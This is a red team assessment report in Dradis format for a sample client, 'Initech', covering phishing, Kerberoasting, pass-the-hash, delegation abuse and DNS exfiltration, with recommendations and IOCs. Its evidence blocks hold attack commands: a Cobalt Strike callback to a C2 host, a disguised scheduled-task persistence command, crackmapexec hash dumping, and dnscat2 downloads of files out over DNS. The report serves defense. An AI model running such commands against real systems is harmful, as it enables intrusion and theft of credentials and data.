node.label: Report content
node.properties: { "dradis.client": "Initech Corporation", "dradis.project": "Red Team Assessment Report", "dradis.version": "v1.0", "dradis.author": "Red Cell Operations", "dradis.start_date": "3/02/2026", "dradis.end_date": "14/03/2026", "dradis.overall_risk_level": "Critical" }

content_block.author: operator@redcell.local
content_block.content:
#[Title]# 1. Rules of Engagement
#[Type]# Rules of Engagement
#[Description]# This assessment was conducted under the following constraints:
* *Scope*: All internal network segments (10.10.0.0/16) and the external-facing DMZ (203.0.113.0/24) * *Excluded*: Production database content, denial-of-service attacks, physical intrusion * *Duration*: {{ document_properties.dradis.start_date }} through {{ document_properties.dradis.end_date }} * *Notification*: Only the CISO and VP of IT Security were aware of the engagement * *Emergency contact*: Available 24/7 via encrypted channel for immediate deconfliction
All activities were logged with timestamps for correlation with the client's detection capabilities.

content_block.author: operator@redcell.local
content_block.content:
#[Title]# 2. Executive Summary
#[Type]# Executive Summary
#[Description]# {{ document_properties.dradis.client }} engaged Red Cell Operations to conduct a full-scope red team assessment simulating an advanced persistent threat. The engagement identified {{ issues.size }} findings across the kill chain, from initial reconnaissance through data exfiltration.
The red team achieved the primary objective of domain administrator access within 72 hours of initial access. Critical weaknesses in email security controls, Active Directory configuration, and network segmentation allowed the team to move from an external phishing attack to full domain compromise with minimal detection.
Of particular concern, the majority of attack activities went undetected by existing security monitoring, indicating significant gaps in the organization's detection and response capabilities. Only the data exfiltration phase triggered an alert, and even then the response was not timely enough to prevent simulated data loss.
Immediate action is recommended on credential hygiene, Active Directory hardening, and east-west network monitoring.

content_block.author: operator@redcell.local
content_block.content:
#[Title]# 3. Attack Narrative
#[Type]# Attack Narrative
#[Description]# h2. Phase 1: Reconnaissance (Days 1-2)
Open-source intelligence gathering identified key personnel, technology stack, and email formats. LinkedIn profiles revealed the IT team structure and several employees discussing internal tools by name.
h2. Phase 2: Initial Access (Day 3)
A targeted phishing campaign was launched against six employees in the finance department. The pretext leveraged a realistic invoice theme. Two users opened the attachment, and one executed the macro, establishing a C2 callback.
h2. Phase 3: Establishment (Days 3-5)
From the compromised workstation, the team established persistence via a scheduled task disguised as a legitimate Windows update process. Local enumeration revealed cached credentials and network shares.
h2. Phase 4: Credential Harvesting (Days 5-7)
Kerberoasting against Active Directory yielded service account tickets. Offline cracking recovered the password for svc_backup, which had excessive privileges including local admin on multiple servers.
h2. Phase 5: Lateral Movement & Escalation (Days 7-10)
Using the service account credentials, the team moved laterally to the web server and mail gateway. Pass-the-hash techniques provided access to additional systems. Unconstrained delegation on the web server was exploited to obtain a Domain Admin TGT.
h2. Phase 6: Objective Completion (Days 10-12)
With domain admin access, the team demonstrated access to sensitive file shares, email archives, and the ability to exfiltrate data via DNS tunneling. The exfiltration was the only phase that triggered a security alert.

content_block.author: operator@redcell.local
content_block.content:
#[Title]# 4. Key Findings
#[Type]# Key Findings
#[Description]# The assessment identified {{ issues.size }} findings of varying severity. The most impactful findings form a connected attack chain:
* Phishing email with malicious macro achieved initial access (bypassing email filters and endpoint protection) * Kerberoasting yielded service account credentials due to weak password policy for service accounts * Unconstrained delegation on a web server enabled domain admin compromise * DNS tunneling exfiltration succeeded for several hours before detection
Common themes observed across findings include insufficient monitoring of internal network traffic, over-privileged service accounts, and a lack of network segmentation between corporate and sensitive server segments.

content_block.author: operator@redcell.local
content_block.content:
#[Title]# 5. Detection Analysis
#[Type]# Detection Analysis
#[Description]# A critical component of this assessment was evaluating {{ document_properties.dradis.client }}'s ability to detect and respond to adversary activity. The results indicate significant gaps:
|_. Attack Phase|_. Detection Status|_. Time to Detect|_. Notes| |Reconnaissance|Undetected|N/A|No monitoring of external OSINT exposure| |Phishing delivery|Partially Detected|4 hours|Email filter flagged 2 of 6 emails; no SOC follow-up on the alerts| |Macro execution|Undetected|N/A|Endpoint protection did not block the payload| |Persistence|Undetected|N/A|Scheduled task blended with legitimate processes| |Kerberoasting|Undetected|N/A|No monitoring of TGS requests for service accounts| |Lateral movement|Partially Detected|18 hours|Anomalous login flagged but classified as false positive| |Privilege escalation|Undetected|N/A|Delegation abuse generated no alerts| |Data exfiltration|Detected|6 hours|DNS anomaly detection triggered alert; response was not timely|
Overall, the security operations team detected only 1 of 8 attack phases in time to respond, and the response to the DNS exfiltration alert took an additional 6 hours.

content_block.author: operator@redcell.local
content_block.content:
#[Title]# 6. Recommendations
#[Type]# Recommendations
#[Description]# Based on the findings, {{ document_properties.dradis.client }} should prioritize the following improvements:
h3. Immediate (0-30 days)
* Enforce 25+ character passwords for all service accounts * Remove unconstrained delegation from all servers * Implement LAPS (Local Administrator Password Solution) across all endpoints * Enable Advanced Audit Policy for Kerberos service ticket operations
h3. Short-term (30-90 days)
* Deploy east-west network monitoring (NDR) for internal traffic analysis * Implement network segmentation between corporate, server, and DMZ segments * Enhance email gateway rules to block macro-enabled attachments from external senders * Establish a formal alert triage and escalation process with defined SLAs
h3. Medium-term (90-180 days)
* Implement a Privileged Access Workstation (PAW) architecture for domain administration * Deploy deception technology (honeypots, honey tokens) in critical network segments * Conduct purple team exercises quarterly to validate detection capabilities * Establish a threat hunting program focused on the attack techniques identified in this assessment

content_block.author: operator@redcell.local
content_block.content:
#[Title]# 7.1 Tools and Techniques Used
#[Type]# Appendix
#[Description]# The following tools and frameworks were used during the engagement:
|_. Category|_. Tools| |Reconnaissance|theHarvester, LinkedIn, Maltego CE, Shodan| |Phishing|GoPhish, custom Office macro builder| |C2 Framework|Cobalt Strike 4.9 (licensed)| |Credential Attacks|Rubeus, Hashcat, Mimikatz| |Lateral Movement|CrackMapExec, Impacket (psexec, wmiexec)| |Privilege Escalation|BloodHound, Rubeus| |Exfiltration|dnscat2, custom DNS tunneling scripts| |Reporting|Dradis Framework|

content_block.author: operator@redcell.local
content_block.content:
#[Title]# 7.2 Indicators of Compromise
#[Type]# Appendix
#[Description]# The following IOCs should be used to sweep for any residual artifacts from the assessment:
|_. Type|_. Value|_. Context| |IP Address|198.51.100.25|C2 callback server| |Domain|updates-cdn.initechcorp.net|C2 domain (DNS tunneling)| |Hash (SHA256)|a1b2c3d4e5f6...7890abcdef|Malicious macro document| |Scheduled Task|\\Microsoft\\Windows\\UpdateOrchestrator\\RedCellPersist|Persistence mechanism| |Service Account|svc_backup|Compromised service account|
All C2 infrastructure was decommissioned at the conclusion of the engagement. The scheduled task persistence mechanism was removed during the cleanup phase.

note.author: BloodHound import
note.text:
#[Title]# Domain Controller Details
#[IP]# 10.10.1.5
#[Hostname]# DC01.initech.local
#[Type]# Domain Controller

evidence.content:
#[Output]# bc.. [*] Kerberoasting - requesting TGS tickets [*] Found SPN: MSSQLSvc/DB01.initech.local:1433 - svc_backup [*] Found SPN: HTTP/WEB01.initech.local - svc_web [*] Saved 2 TGS tickets to /tmp/tgs_tickets.kirbi [*] Cracking with hashcat... [*] svc_backup:Summer2025! - cracked in 47 minutes
#[Timestamp]# Day 5 — 14:22 UTC
#[Show]# Yes

#[Output]# bc.. [*] Requesting TGT for DC01$ using S4U2Self [*] Exploiting unconstrained delegation on WEB01 [*] Obtained TGT for Administrator@INITECH.LOCAL [*] Pass-the-ticket successful [*] Domain Admin access confirmed
C:\> whoami initech\administrator
C:\> net group "Domain Admins" /domain Members: Administrator, da_admin
#[Timestamp]# Day 9 — 03:15 UTC
#[Show]# Yes

note.author: CrackMapExec import
note.text:
#[Title]# Web Server Details
#[IP]# 10.10.1.20
#[Hostname]# WEB01.initech.local
#[Type]# Web Application Server

evidence.content:
#[Output]# bc.. $ crackmapexec smb 10.10.1.20 -u svc_backup -p 'Summer2025!' --local-auth SMB 10.10.1.20 445 WEB01 [*] Windows Server 2019 Build 17763 x64 SMB 10.10.1.20 445 WEB01 [+] WEB01\svc_backup:Summer2025! (Pwn3d!) SMB 10.10.1.20 445 WEB01 [*] Dumping SAM hashes... SMB 10.10.1.20 445 WEB01 Administrator:500:aad3b435...:::
#[Timestamp]# Day 7 — 22:05 UTC
#[Show]# Yes

#[Output]# bc.. [*] Checking delegation settings on WEB01$ [*] WEB01$ has TRUSTED_FOR_DELEGATION set (unconstrained) [*] This machine can impersonate any user to any service [*] Setting up a listener for incoming TGTs...
#[Timestamp]# Day 8 — 11:30 UTC
#[Show]# Yes

#[Output]# bc.. $ crackmapexec smb 10.10.1.30 -u Administrator -H aad3b435... SMB 10.10.1.30 445 MAIL01 [+] INITECH\Administrator (Pwn3d!) SMB 10.10.1.30 445 MAIL01 [*] Enumerating mailboxes... SMB 10.10.1.30 445 MAIL01 [*] Found 847 mailboxes
#[Timestamp]# Day 8 — 09:40 UTC
#[Show]# Yes

#[Output]# bc.. # From compromised internal host, testing DMZ segmentation $ ping 203.0.113.50 PING 203.0.113.50: 64 bytes, seq=0, ttl=63, time=1.2ms
$ curl -k https://203.0.113.50/admin HTTP/1.1 200 OK # Admin panel accessible from corporate network — no segmentation
$ ssh svc_backup@203.0.113.50 svc_backup@203.0.113.50's password: Welcome to Ubuntu 22.04 LTS # Same service account credentials work on DMZ host
#[Timestamp]# Day 10 — 16:20 UTC
#[Show]# Yes

note.author: Cobalt Strike import
note.text:
#[Title]# Compromised Workstation Details
#[IP]# 10.10.2.100
#[Hostname]# WS-JDOE.initech.local
#[Type]# User Workstation (Initial Foothold)

evidence.content:
#[Output]# bc.. From: "Accounts Payable" <ap-noreply@initech-invoices.com> Subject: Invoice #INV-2026-0847 — Payment Overdue
Dear Jane,
Please review the attached invoice for the outstanding balance. Payment is required within 48 hours to avoid late fees.
Attachment: Invoice_INV-2026-0847.xlsm
--- [*] GoPhish campaign results: Emails sent: 6 Emails opened: 4 Attachments opened: 2 Macros executed: 1 (j.doe@initech.com)
#[Timestamp]# Day 3 — 09:15 UTC
#[Show]# Yes

#[Output]# bc.. [*] Macro executed on WS-JDOE (10.10.2.100) [*] Payload: Cobalt Strike HTTPS beacon [*] C2 callback established to 198.51.100.25:443 [*] Beacon ID: 48291 [*] User: INITECH\j.doe (Finance Department) [*] Process: EXCEL.EXE -> rundll32.exe (migrated) [*] Endpoint protection: CrowdStrike Falcon — DID NOT DETECT
beacon> sleep 60 30 [*] Tasked beacon to sleep 60s with 30% jitter
beacon> sysinfo Computer: WS-JDOE OS: Windows 11 Enterprise 23H2 User: j.doe (INITECH) Process: rundll32.exe (PID: 4892)
#[Timestamp]# Day 3 — 09:18 UTC
#[Show]# Yes

#[Output]# bc.. beacon> shell schtasks /create /tn "Microsoft\Windows\UpdateOrchestrator\UpdateCheck" /tr "rundll32.exe C:\ProgramData\msupdate.dll,Entry" /sc daily /st 08:00 /ru SYSTEM SUCCESS: The scheduled task "UpdateCheck" has been successfully created.
beacon> ls C:\ProgramData\msupdate.dll 12/03/2026 02:14 <FILE> msupdate.dll (Cobalt Strike DLL)
#[Timestamp]# Day 4 — 02:14 UTC
#[Show]# Yes

#[Output]# bc.. beacon> shell dnscmd . /config /forwarders 198.51.100.25 [*] DNS configuration modified
[*] Starting dnscat2 tunnel via updates-cdn.initechcorp.net [*] Establishing session... [*] Session established!
dnscat2> download \\DC01\SYSVOL\initech.local\Policies\passwords.xlsx [*] Downloading 2.3 MB... [*] Download complete — exfiltrated via DNS TXT queries [*] Transfer rate: ~15 KB/s over 847 DNS queries
dnscat2> download \\MAIL01\c$\exports\executive-mailboxes-2026.pst [*] Downloading 156 MB... [*] Estimated time: ~3 hours via DNS tunneling
--- SOC ALERT TRIGGERED AT T+6 HOURS --- [!] DNS Anomaly Detection: Excessive TXT queries to updates-cdn.initechcorp.net
#[Timestamp]# Day 11 — 01:30 UTC
#[Show]# Yes

issue.author: operator@redcell.local
issue.text:
#[Title]# OSINT: Employee Information Exposed on Social Media
#[ATT&CK Tactic]# Reconnaissance
#[ATT&CK Technique]# T1593 - Search Open Websites/Domains
#[Severity]# Informational
#[Description]# Open-source intelligence gathering revealed significant information about the organization's personnel, technology stack, and internal processes through publicly available sources.
#[Attack Narrative]# LinkedIn profiles for multiple IT staff members disclosed specific technologies in use (CrowdStrike Falcon, Cisco ASA, Exchange 2019). Several employees had posted about internal migration projects, revealing the Active Directory domain name and naming conventions. Job postings confirmed the use of specific software versions. This information was used to tailor the phishing campaign and plan post-exploitation activities.
#[Detection Status]# Undetected
#[Business Impact]# Publicly available information enabled the red team to build a detailed profile of the organization's technology environment, significantly reducing the time required for subsequent attack phases. An adversary could use this information to craft highly targeted attacks.
#[Recommendations]# * Implement an employee social media awareness program focused on operational security * Review and restrict information disclosed in public job postings * Periodically audit the organization's external information footprint * Consider a dedicated OSINT assessment to identify and remediate exposed information
#[References]# * "MITRE ATT&CK T1593":https://attack.mitre.org/techniques/T1593/ * "OSINT Framework":https://osintframework.com/

issue.author: operator@redcell.local
issue.text:
#[Title]# Phishing Campaign Achieved Initial Foothold
#[ATT&CK Tactic]# Initial Access
#[ATT&CK Technique]# T1566.001 - Phishing: Spearphishing Attachment
#[Severity]# High
#[Description]# A targeted spearphishing campaign using a realistic invoice pretext successfully delivered a malicious macro-enabled document to a finance department employee. The email bypassed the organization's email security gateway for 4 of 6 messages sent.
#[Attack Narrative]# The red team registered a lookalike domain (initech-invoices.com) and crafted emails mimicking the organization's accounts payable notification format. Of six emails sent to finance staff, four reached the inbox (two were caught by the email filter). Two recipients opened the attachment, and one executed the macro, establishing the initial foothold.
The phishing pretext was informed by OSINT gathered during the reconnaissance phase, including the target's name, role, and typical business communications observed through public sources.
#[Detection Status]# Partially Detected
#[Business Impact]# The email gateway failed to block the majority of phishing emails, and one user executed the malicious payload. This provided the red team with a persistent foothold inside the corporate network, enabling all subsequent attack phases.
#[Recommendations]# * Enhance email gateway rules to quarantine macro-enabled attachments from external senders * Implement DMARC, DKIM, and SPF with strict enforcement * Conduct regular phishing awareness training with simulated campaigns * Deploy browser isolation for email attachment previews
#[References]# * "MITRE ATT&CK T1566.001":https://attack.mitre.org/techniques/T1566/001/ * "GoPhish Framework":https://getgophish.com/

issue.author: operator@redcell.local
issue.text:
#[Title]# Malicious Macro Bypassed Endpoint Protection
#[ATT&CK Tactic]# Execution
#[ATT&CK Technique]# T1204.002 - User Execution: Malicious File
#[Severity]# Critical
#[Description]# A macro-enabled Excel document executed a Cobalt Strike beacon payload on a finance workstation without triggering the installed endpoint detection and response (EDR) solution. The payload established an encrypted HTTPS C2 channel.
#[Attack Narrative]# The macro used a multi-stage approach: the initial VBA code downloaded a DLL from the C2 server, loaded it via rundll32.exe, and established an HTTPS beacon. The payload was designed to evade CrowdStrike Falcon by using legitimate Windows processes and encrypted communications. Process migration from EXCEL.EXE to rundll32.exe completed within seconds of execution.
No endpoint protection alerts were generated at any point during the initial execution chain.
#[Detection Status]# Undetected
#[Business Impact]# The failure of endpoint protection to detect and block the malicious payload resulted in a fully functional command-and-control implant inside the corporate network. This represents a critical gap in the organization's primary defense layer against malware execution.
#[Recommendations]# * Engage the EDR vendor to tune detection rules for macro-based execution chains * Implement Attack Surface Reduction (ASR) rules to block Office macro child processes * Disable macros for users who do not require them for business operations * Deploy application whitelisting on high-value workstations
#[References]# * "MITRE ATT&CK T1204.002":https://attack.mitre.org/techniques/T1204/002/ * "Microsoft ASR Rules":https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference

issue.author: operator@redcell.local
issue.text:
#[Title]# Kerberoasting Yielded Service Account Credentials
#[ATT&CK Tactic]# Credential Access
#[ATT&CK Technique]# T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting
#[Severity]# Critical
#[Description]# Service accounts with Service Principal Names (SPNs) registered in Active Directory were found to use weak passwords that could be cracked offline. The svc_backup account password was recovered in under one hour using commodity hardware.
#[Attack Narrative]# From the compromised workstation, the red team used Rubeus to request TGS tickets for all accounts with registered SPNs. Two service accounts were identified: svc_backup (MSSQLSvc/DB01) and svc_web (HTTP/WEB01). The TGS tickets were exported and cracked offline using Hashcat with a wordlist and rules. The svc_backup password (Summer2025!) was recovered in 47 minutes. This account had local administrator privileges on multiple servers.
No alerts were generated for the Kerberos ticket requests, indicating a lack of monitoring for this well-known attack technique.
#[Detection Status]# Undetected
#[Business Impact]# Compromise of the svc_backup service account provided local administrator access to multiple servers, enabling lateral movement across the environment. The weak password and excessive privileges represent a systemic risk to the Active Directory environment.
#[Recommendations]# * Enforce 25+ character passwords for all service accounts (or use Group Managed Service Accounts) * Implement monitoring and alerting for anomalous TGS ticket requests (Event ID 4769) * Reduce service account privileges to the minimum required * Conduct a regular review of accounts with SPNs registered in Active Directory
#[References]# * "MITRE ATT&CK T1558.003":https://attack.mitre.org/techniques/T1558/003/ * "Rubeus":https://github.com/GhostPack/Rubeus

issue.author: operator@redcell.local
issue.text:
#[Title]# Lateral Movement via Pass-the-Hash
#[ATT&CK Tactic]# Lateral Movement
#[ATT&CK Technique]# T1550.002 - Use Alternate Authentication Material: Pass the Hash
#[Severity]# High
#[Description]# Compromised credential hashes were used to authenticate to additional systems without knowing the plaintext passwords. The red team moved from the initial workstation to the web server and mail gateway using this technique.
#[Attack Narrative]# Using the svc_backup credentials obtained via Kerberoasting, the red team authenticated to WEB01 (10.10.1.20) and dumped local SAM hashes. The local Administrator hash was then used via pass-the-hash to access MAIL01 (10.10.1.30) and enumerate mailboxes. CrackMapExec was used for both lateral movement and credential dumping.
An anomalous login alert was triggered on the web server but was classified as a false positive by the SOC analyst, allowing the attack to continue unimpeded.
#[Detection Status]# Partially Detected
#[Business Impact]# The ability to move freely between systems using credential material enabled the red team to access increasingly sensitive assets, including the mail server containing 847 mailboxes. Lateral movement was the bridge between initial compromise and full domain access.
#[Recommendations]# * Implement LAPS to ensure unique local administrator passwords on each system * Deploy Credential Guard on all Windows endpoints to protect credential material * Enhance SOC procedures for investigating anomalous authentication events * Restrict administrative protocols (SMB, RDP, WinRM) to designated management networks
#[References]# * "MITRE ATT&CK T1550.002":https://attack.mitre.org/techniques/T1550/002/ * "CrackMapExec":https://github.com/byt3bl33d3r/CrackMapExec

issue.author: operator@redcell.local
issue.text:
#[Title]# Persistence Established via Scheduled Task
#[ATT&CK Tactic]# Persistence
#[ATT&CK Technique]# T1053.005 - Scheduled Task/Job: Scheduled Task
#[Severity]# Medium
#[Description]# A scheduled task was created on the compromised workstation to maintain persistent access. The task was disguised as a legitimate Windows Update process and configured to execute daily at 08:00 as SYSTEM.
#[Attack Narrative]# The red team created a scheduled task named "Microsoft\Windows\UpdateOrchestrator\UpdateCheck" that executed a Cobalt Strike DLL stored in C:\ProgramData. The task name and path were chosen to blend with legitimate Windows Update tasks. The DLL was also named to mimic legitimate software (msupdate.dll).
This persistence mechanism survived a system reboot during the engagement and was not detected by endpoint protection or security monitoring.
#[Detection Status]# Undetected
#[Business Impact]# The persistence mechanism ensured continued access even if the original beacon was terminated or the system was rebooted. This is a common technique used by real-world adversaries to maintain long-term access to compromised environments.
#[Recommendations]# * Monitor for creation of scheduled tasks running as SYSTEM (Event ID 4698) * Implement application whitelisting to prevent execution of unauthorized DLLs * Periodically audit scheduled tasks across all systems for unauthorized entries * Deploy file integrity monitoring on sensitive directories (ProgramData, System32)
#[References]# * "MITRE ATT&CK T1053.005":https://attack.mitre.org/techniques/T1053/005/

issue.author: operator@redcell.local
issue.text:
#[Title]# Domain Admin Achieved Through Delegation Abuse
#[ATT&CK Tactic]# Privilege Escalation
#[ATT&CK Technique]# T1134.001 - Access Token Manipulation: Token Impersonation/Theft
#[Severity]# Critical
#[Description]# The internal web server (WEB01) was configured with unconstrained Kerberos delegation, allowing it to impersonate any domain user to any service. The red team exploited this to obtain a Domain Admin ticket-granting ticket (TGT).
#[Attack Narrative]# BloodHound analysis from the compromised workstation identified that WEB01 had the TRUSTED_FOR_DELEGATION flag set in Active Directory. After gaining local administrator access to WEB01 via the svc_backup account, the red team used Rubeus to monitor for incoming TGTs. A simulated authentication trigger (via printer bug) caused DC01 to authenticate to WEB01, providing the DC01$ machine account TGT. Using S4U2Self, this was leveraged to obtain a TGT for the Domain Administrator account.
Total time from initial foothold to Domain Admin: approximately 6 days.
#[Detection Status]# Undetected
#[Business Impact]# Domain Admin access provides complete control over the Active Directory environment, including all user accounts, Group Policy, file shares, email, and connected systems. This represents a total compromise of the organization's identity infrastructure.
#[Recommendations]# * Remove unconstrained delegation from all servers — migrate to constrained delegation or resource-based constrained delegation where delegation is required * Implement Protected Users group for all privileged accounts * Deploy a tiered administration model to limit the exposure of Domain Admin credentials * Monitor for TGT requests from non-DC sources (Event ID 4768 with unusual service names)
#[References]# * "MITRE ATT&CK T1134.001":https://attack.mitre.org/techniques/T1134/001/ * "BloodHound":https://github.com/BloodHoundAD/BloodHound * "Unconstrained Delegation Abuse":https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation

issue.author: operator@redcell.local
issue.text:
#[Title]# Data Exfiltration via DNS Tunneling
#[ATT&CK Tactic]# Exfiltration
#[ATT&CK Technique]# T1048.003 - Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol
#[Severity]# Critical
#[Description]# Sensitive data was exfiltrated from the network using DNS tunneling, bypassing traditional network egress controls. The exfiltration operated for approximately 6 hours before triggering a DNS anomaly detection alert.
#[Attack Narrative]# Using Domain Admin access, the red team configured a DNS forwarder on the compromised workstation to route queries through the C2 server. Data from file shares (including a password spreadsheet from SYSVOL) and executive mailbox exports was encoded into DNS TXT queries directed at the red team's domain (updates-cdn.initechcorp.net).
The transfer operated at approximately 15 KB/s over 847 DNS queries per file. After 6 hours, the organization's DNS anomaly detection system flagged the excessive TXT query volume. However, the SOC response to the alert took an additional 6 hours, during which exfiltration continued.
#[Detection Status]# Detected
#[Business Impact]# Successful exfiltration of sensitive data including credentials and executive communications demonstrates that an adversary could steal proprietary information, intellectual property, or personally identifiable information. The delayed response indicates a gap in the incident response process.
#[Recommendations]# * Implement DNS query logging and analysis for anomalous patterns (high volume, TXT records, long subdomain labels) * Restrict DNS resolution to approved resolvers only (block direct external DNS) * Establish alert response SLAs and escalation procedures for high-severity network anomalies * Deploy data loss prevention (DLP) controls on sensitive file shares and email archives
#[References]# * "MITRE ATT&CK T1048.003":https://attack.mitre.org/techniques/T1048/003/ * "dnscat2":https://github.com/iagox86/dnscat2

issue.author: operator@redcell.local
issue.text:
#[Title]# Security Monitoring Blind Spots in East-West Traffic
#[ATT&CK Tactic]# Defense Evasion
#[ATT&CK Technique]# T1562.006 - Impair Defenses: Indicator Blocking
#[Severity]# Medium
#[Description]# Internal network traffic between corporate segments was not monitored by any network detection capability. The red team moved freely between systems using SMB, WMI, and Kerberos protocols without generating network-level alerts.
#[Attack Narrative]# Throughout the engagement, all internal lateral movement — including credential dumping over SMB, WMI command execution, and Kerberos ticket manipulation — went undetected at the network layer. The organization's NDR/IDS deployment covered only north-south traffic (internet to internal), leaving east-west traffic completely unmonitored.
This allowed the red team to operate with high confidence that network-based detection would not impede operations, significantly accelerating the attack timeline.
#[Detection Status]# Undetected
#[Business Impact]# The absence of east-west traffic monitoring means that any adversary who achieves initial access can move laterally without triggering network-based alerts. This was the single largest enabler of the red team's success, as it allowed unrestricted movement from a user workstation to the domain controller.
#[Recommendations]# * Deploy network detection and response (NDR) sensors on internal network segments * Implement micro-segmentation between workstation, server, and management VLANs * Enable Windows Firewall rules to restrict unnecessary lateral protocols (SMB, WMI, RDP) * Establish network flow baselines and alert on anomalous internal traffic patterns
#[References]# * "MITRE ATT&CK T1562.006":https://attack.mitre.org/techniques/T1562/006/

issue.author: operator@redcell.local
issue.text:
#[Title]# Weak Network Segmentation Between Corporate and DMZ
#[ATT&CK Tactic]# Discovery
#[ATT&CK Technique]# T1046 - Network Service Scanning
#[Severity]# Low
#[Description]# Network segmentation between the corporate network and the DMZ was found to be insufficient. From a compromised internal host, the red team could directly access management interfaces on DMZ systems, and the same service account credentials were valid in both environments.
#[Attack Narrative]# After achieving domain admin access, the red team tested network boundaries by attempting to reach DMZ hosts from the corporate network. The external web application server (203.0.113.50) was fully accessible via SSH and HTTPS from internal systems. Furthermore, the svc_backup credentials obtained during the engagement were valid on the DMZ host, indicating shared credential management across network zones.
#[Detection Status]# Undetected
#[Business Impact]# Weak segmentation between corporate and DMZ environments means that compromise of the internal network automatically extends to internet-facing systems. An adversary could pivot from internal access to compromise externally hosted applications or use DMZ systems as staging points for further attacks.
#[Recommendations]# * Implement strict firewall rules between corporate and DMZ segments, allowing only required application traffic * Use separate credential stores and administrative accounts for DMZ systems * Deploy jump servers or PAWs for all DMZ administrative access * Conduct regular firewall rule reviews to identify and remove overly permissive rules
#[References]# * "MITRE ATT&CK T1046":https://attack.mitre.org/techniques/T1046/ * "NIST SP 800-41 Guidelines on Firewalls and Firewall Policy":https://csrc.nist.gov/publications/detail/sp/800-41/rev-1/final

card.name: Collection & Exfiltration
card.description:
#[Results]# Tester comments
#[Objective]# Demonstrate access to sensitive data and the ability to exfiltrate it from the environment.
#[Key Activities]# * Identify and access sensitive file shares, databases, and email archives * Collect sample data that demonstrates the impact of compromise * Test data exfiltration via DNS, HTTPS, or other covert channels * Measure detection response time for exfiltration activities * Document all data accessed (do not exfiltrate actual sensitive data without authorization)
#[Tools]# dnscat2, Cobalt Strike (download), rclone, custom exfil scripts
#[ATT&CK Techniques]# * "T1005 - Data from Local System":https://attack.mitre.org/techniques/T1005/ * "T1039 - Data from Network Shared Drive":https://attack.mitre.org/techniques/T1039/ * "T1048 - Exfiltration Over Alternative Protocol":https://attack.mitre.org/techniques/T1048/
#[References]# * "MITRE ATT&CK Collection Tactic":https://attack.mitre.org/tactics/TA0009/ * "MITRE ATT&CK Exfiltration Tactic":https://attack.mitre.org/tactics/TA0010/

card.name: Defense Evasion Assessment
card.description:
#[Results]# Tester comments
#[Objective]# Evaluate the target's ability to detect and respond to adversary techniques throughout the kill chain.
#[Key Activities]# * Correlate red team activities with SOC alerts and incident tickets * Identify which attack phases were detected, partially detected, or missed * Measure mean time to detect (MTTD) and mean time to respond (MTTR) * Assess EDR, NDR, and SIEM detection coverage against observed techniques * Document detection gaps and recommend improvements
#[Tools]# SIEM correlation, SOC debrief, EDR telemetry review, MITRE ATT&CK Navigator
#[ATT&CK Techniques]# * "T1562 - Impair Defenses":https://attack.mitre.org/techniques/T1562/ * "T1070 - Indicator Removal":https://attack.mitre.org/techniques/T1070/
#[References]# * "MITRE ATT&CK Defense Evasion Tactic":https://attack.mitre.org/tactics/TA0005/ * "MITRE ATT&CK Navigator":https://mitre-attack.github.io/attack-navigator/

card.name: Cleanup & Deconfliction
card.description:
#[Results]# Tester comments
#[Objective]# Remove all red team artifacts, restore systems to pre-engagement state, and provide IOCs for threat hunting.
#[Key Activities]# * Remove all persistence mechanisms (scheduled tasks, registry keys, services) * Delete dropped tools, payloads, and staged files * Decommission C2 infrastructure * Provide complete IOC list to the blue team (IPs, domains, hashes, file paths) * Confirm all artifacts have been removed through a sweep
#[Tools]# Cobalt Strike (cleanup), PowerShell, manual verification
#[ATT&CK Techniques]# N/A — this is an operational phase, not an adversary technique
#[References]# * Coordinate with the client's IT and security teams for deconfliction * Maintain a real-time log of all changes made during the engagement

card.name: Reporting & Debrief
card.description:
#[Results]# Tester comments
#[Objective]# Produce a comprehensive report and conduct debriefs with technical and executive stakeholders.
#[Key Activities]# * Write the attack narrative as a chronological story * Document all findings with evidence, impact, and remediation guidance * Create a detection gap analysis mapping activities to MITRE ATT&CK * Prepare executive summary with key metrics and risk ratings * Conduct technical debrief with the security team (purple team review) * Conduct executive debrief with leadership focusing on business impact and recommendations
#[Tools]# Dradis Framework, MITRE ATT&CK Navigator, report templates
#[ATT&CK Techniques]# N/A — this is a reporting phase
#[References]# * "PTES Reporting":http://www.pentest-standard.org/index.php/Reporting

card.name: Credential Access
card.description:
#[Results]# Kerberoasting yielded svc_backup credentials (see finding #4). AS-REP roasting identified no vulnerable accounts. NTDS.dit extraction pending Domain Admin access.
#[Objective]# Obtain credentials to enable lateral movement and privilege escalation.
#[Key Activities]# * Kerberoast service accounts with SPNs * AS-REP roast accounts without pre-authentication * Dump credentials from memory (LSASS), SAM, or NTDS.dit * Search for credentials in files, scripts, and Group Policy Preferences * Attempt offline cracking of harvested hashes
#[Tools]# Rubeus, Mimikatz, Hashcat, CrackMapExec, Impacket (secretsdump)
#[ATT&CK Techniques]# * "T1558 - Steal or Forge Kerberos Tickets":https://attack.mitre.org/techniques/T1558/ * "T1003 - OS Credential Dumping":https://attack.mitre.org/techniques/T1003/ * "T1552 - Unsecured Credentials":https://attack.mitre.org/techniques/T1552/
#[References]# * "MITRE ATT&CK Credential Access Tactic":https://attack.mitre.org/tactics/TA0006/

card.name: Lateral Movement
card.description:
#[Results]# Pass-the-hash with svc_backup successful on WEB01 and MAIL01. Testing additional targets.
#[Objective]# Move between systems to reach high-value targets and expand access.
#[Key Activities]# * Use pass-the-hash or pass-the-ticket for authentication * Execute commands remotely via SMB, WMI, or WinRM * Pivot through compromised systems to reach segmented networks * Access additional workstations and servers * Document all systems accessed and methods used
#[Tools]# CrackMapExec, Impacket (psexec, wmiexec, smbexec), Evil-WinRM, Chisel
#[ATT&CK Techniques]# * "T1550 - Use Alternate Authentication Material":https://attack.mitre.org/techniques/T1550/ * "T1021 - Remote Services":https://attack.mitre.org/techniques/T1021/ * "T1570 - Lateral Tool Transfer":https://attack.mitre.org/techniques/T1570/
#[References]# * "MITRE ATT&CK Lateral Movement Tactic":https://attack.mitre.org/tactics/TA0008/

card.name: Privilege Escalation
card.description:
#[Results]# BloodHound identified unconstrained delegation on WEB01. Exploitation in progress.
#[Objective]# Escalate privileges to Domain Admin or equivalent level of access.
